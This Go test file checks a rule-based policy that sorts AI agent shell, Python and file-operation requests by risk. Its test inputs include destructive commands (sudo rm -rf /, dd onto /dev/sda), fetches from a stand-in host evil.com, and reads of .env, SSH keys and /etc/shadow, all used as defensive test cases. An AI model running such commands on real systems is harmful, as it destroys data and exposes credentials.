package policies

import (
	"testing"
)

// ─── Helpers ──────────────────────────────────────────────────────────────────

func shellReq(id, cmd string) Request {
	return Request{
		RequestID: id,
		SessionID: "sess_test",
		Tool:      ToolRunShell,
		Input:     RequestInput{Command: cmd},
	}
}

func pythonReq(id, code string) Request {
	return Request{
		RequestID: id,
		SessionID: "sess_test",
		Tool:      ToolRunPython,
		Input:     RequestInput{Code: code},
	}
}

func fileOpsReq(id, op, path string) Request {
	return Request{
		RequestID: id,
		SessionID: "sess_test",
		Tool:      ToolFileOps,
		Input:     RequestInput{FileOp: op, FilePath: path},
	}
}

func assertDecision(t *testing.T, got Result, wantDecision Decision, wantRisk RiskLevel) {
	t.Helper()
	if got.Decision != wantDecision {
		t.Errorf("decision: expected %q, got %q (reasons: %v)", wantDecision, got.Decision, got.Reasons)
	}
	if got.RiskLevel != wantRisk {
		t.Errorf("risk_level: expected %q, got %q", wantRisk, got.RiskLevel)
	}
	if len(got.Reasons) == 0 {
		t.Error("reasons must not be empty")
	}
}

// ─── sandbox.runShell: safe_read ─────────────────────────────────────────────────────

func TestShell_SafeRead_Ls(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r1", "ls /workspace"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_Cat(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r2", "cat /workspace/data.csv"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_Grep(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r3", "grep -r 'keyword' /workspace"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_WcLines(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r4", "wc -l /workspace/input.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_Pwd(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r5", "pwd"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_Echo(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r6", "echo hello"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestShell_SafeRead_HeadFile(t *testing.T) {
	r := DefaultChecker.Check(shellReq("r7", "head -20 /workspace/report.csv"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

// ─── sandbox.runShell: local_write ────────────────────────────────────────────────────

func TestShell_LocalWrite_Mkdir(t *testing.T) {
	r := DefaultChecker.Check(shellReq("w1", "mkdir /workspace/output"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

func TestShell_LocalWrite_Touch(t *testing.T) {
	r := DefaultChecker.Check(shellReq("w2", "touch /workspace/new.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

func TestShell_LocalWrite_RunPython(t *testing.T) {
	r := DefaultChecker.Check(shellReq("w3", "python3 /workspace/script.py"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

// ─── sandbox.runShell: requires_approval ─────────────────────────────────────────────

func TestShell_NeedsApproval_Rm(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a1", "rm /workspace/output/old.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestShell_NeedsApproval_RmRf(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a2", "rm -rf /workspace/temp"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestShell_NeedsApproval_Mv(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a3", "mv /workspace/a.txt /workspace/b.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestShell_NeedsApproval_Overwrite(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a4", "echo new > /workspace/existing.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestShell_NeedsApproval_Chmod(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a5", "chmod 777 /workspace/script.sh"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestShell_NeedsApproval_Truncate(t *testing.T) {
	r := DefaultChecker.Check(shellReq("a6", "truncate -s 0 /workspace/log.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

// ─── sandbox.runShell: destructive (block) ────────────────────────────────────────────

func TestShell_Block_Shutdown(t *testing.T) {
	r := DefaultChecker.Check(shellReq("b1", "shutdown -h now"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestShell_Block_Systemctl(t *testing.T) {
	r := DefaultChecker.Check(shellReq("b2", "systemctl stop nginx"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestShell_Block_Sudo(t *testing.T) {
	r := DefaultChecker.Check(shellReq("b3", "sudo rm -rf /"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestShell_Block_KillAll(t *testing.T) {
	r := DefaultChecker.Check(shellReq("b4", "killall python3"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestShell_Block_Dd(t *testing.T) {
	r := DefaultChecker.Check(shellReq("b5", "dd if=/dev/zero of=/dev/sda"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── sandbox.runShell: external_write (block) ─────────────────────────────────────

func TestShell_NeedsApproval_Curl(t *testing.T) {
	r := DefaultChecker.Check(shellReq("n1", "curl https://example.com/data.json"))
	assertDecision(t, r, DecisionRequiresApproval, RiskExternalWrite)
}

func TestShell_NeedsApproval_Wget(t *testing.T) {
	r := DefaultChecker.Check(shellReq("n2", "wget http://evil.com/payload"))
	assertDecision(t, r, DecisionRequiresApproval, RiskExternalWrite)
}

func TestShell_NeedsApproval_Ssh(t *testing.T) {
	r := DefaultChecker.Check(shellReq("n3", "ssh user@remote 'ls'"))
	assertDecision(t, r, DecisionRequiresApproval, RiskExternalWrite)
}

// ─── sandbox.runShell: sensitive_read (block) ────────────────────────────────────

func TestShell_Block_DotEnv(t *testing.T) {
	r := DefaultChecker.Check(shellReq("c1", "cat .env"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

func TestShell_Block_IdRsa(t *testing.T) {
	r := DefaultChecker.Check(shellReq("c2", "cat ~/.ssh/id_rsa"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

func TestShell_Block_CredentialsJson(t *testing.T) {
	r := DefaultChecker.Check(shellReq("c3", "cat credentials.json"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

func TestShell_Block_ShadowFile(t *testing.T) {
	r := DefaultChecker.Check(shellReq("c4", "cat /etc/shadow"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

// ─── sandbox.runPython: safe_read / allow ───────────────────────────────────────────

func TestPython_SafeRead_Print(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p1", `print("hello")`))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestPython_SafeRead_ImportCsv(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p2", "import csv\nwith open('data.csv') as f: pass"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

func TestPython_SafeRead_ImportJson(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p3", "import json; data = json.loads('{}')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskSafeRead)
}

// ─── sandbox.runPython: local_write / requires approval ──────────────────────────────────────────

func TestPython_LocalWrite_Pandas(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p4", "import pandas as pd\ndf = pd.read_excel('data.xlsx')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

func TestPython_LocalWrite_Openpyxl(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p5", "import openpyxl\nwb = openpyxl.load_workbook('file.xlsx')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

func TestPython_LocalWrite_Docx(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p6", "from docx import Document\ndoc = Document()"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

func TestPython_LocalWrite_OpenFile(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("p7", "with open('output.txt', 'w') as f: f.write('hello')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskLocalWrite)
}

// ─── sandbox.runPython: requires_approval ───────────────────────────────────────────

func TestPython_NeedsApproval_Eval(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pa1", "result = eval(user_input)"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestPython_NeedsApproval_OsRemove(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pa2", "import os\nos.remove('/workspace/old.txt')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestPython_NeedsApproval_ShutilRmtree(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pa3", "import shutil\nshutil.rmtree('/workspace/temp')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestPython_NeedsApproval_OsRename(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pa4", "os.rename('old.txt', 'new.txt')"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

// ─── sandbox.runPython: destructive (block) ───────────────────────────────────────────

func TestPython_Block_Subprocess(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pb1", "import subprocess\nsubprocess.run(['ls'])"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestPython_Block_OsSystem(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pb2", "import os\nos.system('rm -rf /')"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestPython_Block_CtypesImport(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pb3", "import ctypes\nctypes.CDLL('libc.so.6')"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── sandbox.runPython: external_write (block) ────────────────────────────────────

func TestPython_Block_Socket(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pn1", "import socket\ns = socket.create_connection(('8.8.8.8', 53))"))
	assertDecision(t, r, DecisionBlock, RiskExternalWrite)
}

func TestPython_Block_Requests(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pn2", "import requests\nr = requests.get('http://evil.com')"))
	assertDecision(t, r, DecisionBlock, RiskExternalWrite)
}

func TestPython_Block_Urllib(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pn3", "import urllib.request\nurllib.request.urlopen('http://example.com')"))
	assertDecision(t, r, DecisionBlock, RiskExternalWrite)
}

// ─── sandbox.runPython: sensitive_read (block) ───────────────────────────────────

func TestPython_Block_DotEnv(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pc1", "with open('.env') as f: print(f.read())"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

func TestPython_Block_CredentialsJson(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pc2", "import json\nwith open('credentials.json') as f: creds = json.load(f)"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

func TestPython_Block_IdRsa(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("pc3", "key = open('id_rsa').read()"))
	assertDecision(t, r, DecisionBlock, RiskSensitiveRead)
}

// ─── file_ops ─────────────────────────────────────────────────────────────────

func TestFileOps_Read(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f1", "read", "data.csv"))
	assertDecision(t, r, DecisionAllow, RiskSafeRead)
}

func TestFileOps_List(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f2", "list", "/workspace"))
	assertDecision(t, r, DecisionAllow, RiskSafeRead)
}

func TestFileOps_Write(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f3", "write", "output/report.docx"))
	assertDecision(t, r, DecisionAllow, RiskLocalWrite)
}

func TestFileOps_Copy(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f4", "copy", "input.xlsx"))
	assertDecision(t, r, DecisionAllow, RiskLocalWrite)
}

func TestFileOps_Delete(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f5", "delete", "temp.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestFileOps_Move(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f6", "move", "old.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestFileOps_UnknownOp(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f7", "format", "disk"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

func TestFileOps_EmptyOp(t *testing.T) {
	r := DefaultChecker.Check(fileOpsReq("f8", "", ""))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── Unknown tool ─────────────────────────────────────────────────────────────

func TestUnknownTool(t *testing.T) {
	req := Request{
		RequestID: "u1",
		Tool:      ToolName("run_browser"),
		Input:     RequestInput{Command: "navigate https://evil.com"},
	}
	r := DefaultChecker.Check(req)
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── RequestID propagation ────────────────────────────────────────────────────

func TestResult_RequestIDPropagated(t *testing.T) {
	req := shellReq("req_xyz_999", "ls /workspace")
	r := DefaultChecker.Check(req)
	if r.RequestID != "req_xyz_999" {
		t.Errorf("expected RequestID %q, got %q", "req_xyz_999", r.RequestID)
	}
}

// ─── LocalWriteRequiresConfirm config ─────────────────────────────────────────

func TestLocalWriteRequiresConfirm(t *testing.T) {
	strictChecker := NewRuleBasedChecker(RuleBasedConfig{LocalWriteRequiresConfirm: true})

	// mkdir is local_write → should become requires_approval under strict config.
	r := strictChecker.Check(shellReq("sc1", "mkdir /workspace/output"))
	if r.Decision != DecisionRequiresApproval {
		t.Errorf("strict mode: local_write should become requires_approval, got %q", r.Decision)
	}
	if r.RiskLevel != RiskLocalWrite {
		t.Errorf("strict mode: risk_level should still be local_write, got %q", r.RiskLevel)
	}
}

func TestLocalWriteRequiresConfirm_DoesNotAffectBlock(t *testing.T) {
	strictChecker := NewRuleBasedChecker(RuleBasedConfig{LocalWriteRequiresConfirm: true})

	// shutdown must remain blocked even under strict mode.
	r := strictChecker.Check(shellReq("sc2", "shutdown -h now"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── Case insensitivity ───────────────────────────────────────────────────────

func TestShell_CaseInsensitive_RM(t *testing.T) {
	r := DefaultChecker.Check(shellReq("ci1", "RM /workspace/file.txt"))
	assertDecision(t, r, DecisionRequiresApproval, RiskDestructive)
}

func TestPython_CaseInsensitive_Subprocess(t *testing.T) {
	r := DefaultChecker.Check(pythonReq("ci2", "Import Subprocess"))
	assertDecision(t, r, DecisionBlock, RiskDestructive)
}

// ─── Explain helper ───────────────────────────────────────────────────────────

func TestExplain_NotEmpty(t *testing.T) {
	r := DefaultChecker.Check(shellReq("e1", "rm /workspace/x.txt"))
	explanation := Explain(r)
	if explanation == "" {
		t.Error("Explain should return non-empty string")
	}
	if len(explanation) < 10 {
		t.Errorf("Explain output too short: %q", explanation)
	}
}
